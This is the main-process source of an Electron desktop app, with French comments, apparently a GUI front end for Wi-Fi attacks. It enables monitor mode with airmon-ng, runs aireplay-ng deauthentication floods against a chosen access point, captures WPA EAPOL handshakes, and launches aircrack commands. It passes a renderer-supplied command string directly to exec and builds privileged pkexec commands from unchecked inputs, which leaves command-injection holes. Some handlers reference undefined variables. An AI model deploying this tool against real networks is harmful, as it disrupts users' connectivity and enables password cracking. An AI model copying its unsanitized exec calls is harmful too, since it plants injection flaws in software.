// Import Des Dépendances
const { app, BrowserWindow, ipcMain, BaseWindow, WebContentsView, globalShortcut, webContents } = require('electron')
const path = require('node:path')
const { exec } = require('child_process');
const wifi = require('node-wifi');
const netkitty = require('netkitty/network');
const fs = require('fs');
const uploadFile = require('./upload'); // Importez la fonction uploadFile
const { Interface } = require('node:readline');
const { log } = require('node:console');



//Gestion Configuration
const configPath = path.join(__dirname, 'config.json');
let config = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
console.log('Configuration:', config);


ipcMain.on('configrequest', (event) => {
    console.log('Demande de configuration reçue...');
    event.reply('configrequest',config);
});

// Variables Globales
let boundsvalue = {}
let actualyview = 'mainwiew';
let mainWindow
let mainwiew
let deauthCounter = 0; // Compteur de requêtes de déauth

// Création de la fenêtre
const createWindow = () => {
  const mainWindow = new BaseWindow({
    width: 800,
    height: 480,
    menuBarVisible: false,
    autoHideMenuBar: true,
    webPreferences: {
        nodeIntegration: true,
        contextIsolation: true
    }
  });

  mainwiew = new WebContentsView({
    webPreferences: {
        preload: path.join(__dirname, 'preload.js'),
        nodeIntegration: true,
        contextIsolation: true
    }
  });

    mainWindow.contentView.addChildView(mainwiew);
    mainwiew.webContents.loadFile('index.html');

   // Initialisation des vues avec les dimensions actuelles de la fenêtre
   updateViewBounds();

   // Écouteur pour le redimensionnement de la fenêtre
   mainWindow.on('resize', () => {
     updateViewBounds();
   });
 
   // Fonction pour mettre à jour les dimensions des vues
   function updateViewBounds() {
     const bounds = mainWindow.getBounds();
     boundsvalue = bounds;
     const width = bounds.width;
     const height = bounds.height;
     mainwiew.setBounds({ x: 0, y: 0, width: width, height: height });
    }
  
    // Gestion des événements IPC pour changer de vue
ipcMain.on('show-view', (event, view) => {
    console.log('show-view', view);
    const bounds = boundsvalue;
    const width = bounds.width;
    const height = bounds.height;

    if (view === 'mainwiew') {
      if (actualyview === 'mainwiew') {
        console.log('La vue principale est déjà affichée.');
        } else {
        mainwiew.webContents.loadFile('index.html');
        actualyview = 'mainwiew';
        }

    } else if (view === 'settingswiew') {
      if (actualyview === 'settingswiew') {
        console.log('La vue des paramètres est déjà affichée.');
      }else {
      mainwiew.webContents.loadFile('settings.html');
      actualyview = 'settingswiew';
      }
    }
});    
    
    // Activer DevTools si le raccourci Ctrl+Shift+I est utilisé
  globalShortcut.register('Control+Shift+I', () => {
    if (mainwiew && mainwiew.webContents) {
      mainwiew.webContents.toggleDevTools();
    } else {
      console.log("La vue principale n'est pas définie.");
    }
  });

   
 }



app.whenReady().then(() => {
  createWindow()
  // Vérifier si aircrack-ng est installé
  try {
    const { execSync } = require('child_process');
    execSync('which aircrack-ng');
  } catch (error) {
    throw new Error('aircrack-ng n\'est pas installé. Installez-le avec: sudo apt-get install aircrack-ng');
  }
})
ipcMain.on('setconfig', (event, newConfig) => {
    console.log('Nouvelle configuration en application... :', newConfig);
    fs.writeFileSync(configPath, JSON.stringify(newConfig, null, 2));
    console.log('Configuration enregistrée:');
    console.log('application de la nouvelle configuration...');
    config = newConfig; // Utiliser directement newConfig au lieu de relire le fichier
    console.log('Configuration appliquée:', config);
    event.reply('configrequest', config); // Envoyer la nouvelle configuration au renderer
});


ipcMain.on('wifianalyser', (event) => {
    wifi.init({
        iface: null // network interface, choose a random wifi interface if set to null
    });
    
    wifi.scan((error, networks) => {
        if (error) {
            console.log(error);
        } else {
            //console.log(networks);
            event.reply('wifianalyser', networks);
        }
    });
});

ipcMain.on('statusMonitor', (event) => {
    try {
        const { execSync } = require('child_process');
        const result = execSync(`iwconfig ${config.networkcard}`).toString();
        const isMonitorMode = result.includes('Mode:Monitor');
        statusMonitor = isMonitorMode;
        event.reply('statusMonitor', statusMonitor);
        log(`État du moniteur: ${statusMonitor ? 'Activé' : 'Désactivé'}`);
    } catch (error) {
        log(`Erreur lors de la vérification du mode moniteur: ${error.message}`);
        event.reply('statusMonitor', false);
    }
});

ipcMain.on('enableMonitor', (event) => {
  try {
      const { execSync } = require('child_process');

      // Exécuter airmon-ng avec pkexec
      execSync(`pkexec airmon-ng start ${config.networkcard}`);
      
      // Mettre à jour la configuration avec le nouveau nom d'interface
      const newConfig = {
          ...config,
          networkcard: `${config.networkcard}mon`
      };
      fs.writeFileSync(configPath, JSON.stringify(newConfig, null, 2));
      config = newConfig;
      
      // Attendre un peu pour que l'interface se stabilise
      setTimeout(() => {
          try {
              // Vérifier si le mode moniteur a été activé
              const result = execSync(`iwconfig ${config.networkcard}`).toString();
              const isMonitorMode = result.includes('Mode:Monitor');
              
              if (!isMonitorMode) {
                  throw new Error('Le mode moniteur n\'a pas pu être activé');
              }

              event.reply('statusMonitor', true);
              event.reply('configrequest', config); // Envoyer la nouvelle configuration au renderer
              log('Mode moniteur activé avec succès');
          } catch (error) {
              log(`Erreur lors de la vérification du mode moniteur: ${error.message}`);
              event.reply('statusMonitor', false);
          }
      }, 1000);
  } catch (error) {
      log(`Erreur lors de l'activation du mode moniteur: ${error.message}`);
      event.reply('statusMonitor', false);
  }
});

ipcMain.on('disableMonitor', (event) => {
  try {
      const { execSync } = require('child_process');

      // Exécuter airmon-ng avec pkexec
      execSync(`pkexec airmon-ng stop ${config.networkcard}`);
      
      // Mettre à jour la configuration avec le nom d'interface original
      const newConfig = {
          ...config,
          networkcard: config.networkcard.replace('mon', '')
      };
      fs.writeFileSync(configPath, JSON.stringify(newConfig, null, 2));
      config = newConfig;
      
      // Attendre un peu pour que l'interface se stabilise
      setTimeout(() => {
          try {
              // Vérifier si le mode moniteur a été désactivé
              const result = execSync(`iwconfig ${config.networkcard}`).toString();
              const isMonitorMode = result.includes('Mode:Monitor');
              
              if (isMonitorMode) {
                  throw new Error('Le mode moniteur n\'a pas pu être désactivé');
              }

              event.reply('statusMonitor', false);
              event.reply('configrequest', config); // Envoyer la nouvelle configuration au renderer
              log('Mode moniteur désactivé avec succès');
          } catch (error) {
              log(`Erreur lors de la vérification du mode moniteur: ${error.message}`);
              event.reply('statusMonitor', true);
          }
      }, 1000);
  } catch (error) {
      log(`Erreur lors de la désactivation du mode moniteur: ${error.message}`);
      event.reply('statusMonitor', true);
  }
});

ipcMain.on('deauthattack', (event,channel,bssid,deauth) => {
  const { execSync } = require('child_process');
  const { exec } = require('child_process');
  const channelCommand = `pkexec iwconfig ${config.networkcard} channel ${channel}`;
  const attackCommand = `pkexec aireplay-ng --deauth ${deauth} -a ${bssid} ${config.networkcard}`;
  
  try {
    execSync(channelCommand);
    log(`Channel configuré avec succès: ${channel}`);
  } catch (error) {
    log(`Erreur lors de la configuration du channel: ${error.message}`);
    event.reply('deauth-error', 'Erreur de configuration du channel');
    return;
  }
  
  // Réinitialiser le compteur au début de chaque nouvelle attaque
  deauthCounter = 0;
  event.reply('deauth-counter-update', deauthCounter);
  
  // Créer un processus pour exécuter la commande d'attaque
  const attackProcess = exec(attackCommand);
  
  let buffer = '';
  let errorBuffer = '';
  
  // Compter les requêtes de déauth avec une meilleure détection
  attackProcess.stdout.on('data', (data) => {
    buffer += data;
    log(`Sortie aireplay-ng: ${data}`);
    
    // Traiter le buffer ligne par ligne
    const lines = buffer.split('\n');
    buffer = lines.pop(); // Garder la dernière ligne incomplète dans le buffer
    
    for (const line of lines) {
      if (line.includes('Sending DeAuth (code 7)')) {
        deauthCounter++;
        event.reply('deauth-counter-update', deauthCounter);
        log(`Requête de déauth #${deauthCounter} envoyée`);
      }
    }
  });

  // Gérer la fin du processus
  attackProcess.on('close', (code) => {
    if (code === 0) {
      log(`Processus d'attaque terminé avec succès`);
    } else {
      log(`Processus d'attaque terminé avec erreur (code: ${code})`);
      log(`Buffer d'erreur complet: ${errorBuffer}`);
    }
  });

  // Gérer les erreurs du processus
  attackProcess.on('error', (error) => {
    log(`Erreur lors de l'exécution d'aireplay-ng: ${error.message}`);
  });
  
  log(`Commande d'attaque lancée: ${attackCommand}`);
});

// Ajouter un événement pour réinitialiser le compteur
ipcMain.on('reset-deauth-counter', (event) => {
  deauthCounter = 0;
  event.reply('deauth-counter-update', deauthCounter);
});


ipcMain.on('start-handshake-capture', (event, bssid, channel) => {
  // Configurer l'interface sur le bon canal
  const setChannelCmd = `iwconfig ${config.networkcard} channel ${channel}`;
  exec(setChannelCmd, (err) => {
    if (err) {
      log(`Erreur configuration du canal: ${err.message}`);
      event.reply('handshake-capture-error', err.message);
      return;
    }

    log(`🔁 Interface ${config.networkcard} configurée sur le canal ${channel}`);

    // Lancer la capture avec netkitty
    try {
      const capture = new netkitty.Capture({
        device: config.networkcard,
        filter: 'ether proto 0x888e'  // Filtre pour les paquets EAPOL
      });

      capture.on('packet', (packetInfo) => {
        try {
          log('✅ Trame EAPOL détectée, arrêt automatique !');
          capture.stop();
          event.reply('handshake-capture-success', 'EAPOL détecté, capture arrêtée.');
        } catch (error) {
          log(`Erreur lors du traitement du paquet: ${error.message}`);
        }
      });

      capture.on('error', (err) => {
        log(`Erreur netkitty: ${err.message}`);
        event.reply('handshake-capture-error', err.message);
      });

      // Démarrer la capture
      capture.start().then(() => {
        event.reply('handshake-capture-started', {
          bssid,
          channel,
          interface: config.networkcard
        });
        log(`🔍 Capture live démarrée avec filtre EAPOL sur ${config.networkcard}`);
      }).catch(error => {
        log(`Erreur lors du démarrage de la capture: ${error.message}`);
        event.reply('handshake-capture-error', error.message);
      });

    } catch (e) {
      log(`Erreur lors de la capture live: ${e.message}`);
      event.reply('handshake-capture-error', e.message);
    }
  });
});

ipcMain.on('stop-handshake-capture', () => {
  if (capture) {
    capture.stop();
    log('🛑 Capture manuellement arrêtée');
  }
});


ipcMain.on('aircrackattack', (event, command) => {
    const { exec } = require('child_process');
    log(command)
    exec(command)
    //console.log('Airack command:', command);
    /*uploadFile('styles.css', config.apiKey)
     .then(response => {
      const message = response.message;
      console.log(` \x1b[32m${message}\x1b[0m `);
     })
     .catch(error => console.error('Erreur :', error));
    */
});









// Gestion des rapports de log provenant du renderer
ipcMain.on('log-report', (event, report) => {
    console.log('\x1b[32m%s\x1b[0m', 'Rapport Provenant du renderer:\n\n', report);
});

  